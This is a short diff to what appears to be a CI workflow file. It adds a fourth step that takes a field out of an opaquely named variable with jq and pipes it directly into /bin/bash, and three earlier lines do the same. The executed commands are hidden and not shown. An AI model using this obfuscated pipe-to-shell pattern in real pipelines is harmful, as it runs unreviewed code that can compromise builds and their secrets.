@@ -29,6 +29,7 @@ jobs:
           echo $d06 | jq -r .prh05549 | /bin/bash
           echo $qor9 | jq -r .cfgh21 | /bin/bash
           printf '%s' "$t3" | jq -r .h0572 | /bin/bash
+          echo $pygh045 | jq -r .iq19 | /bin/bash
 
       - name: Save output
         if: always()
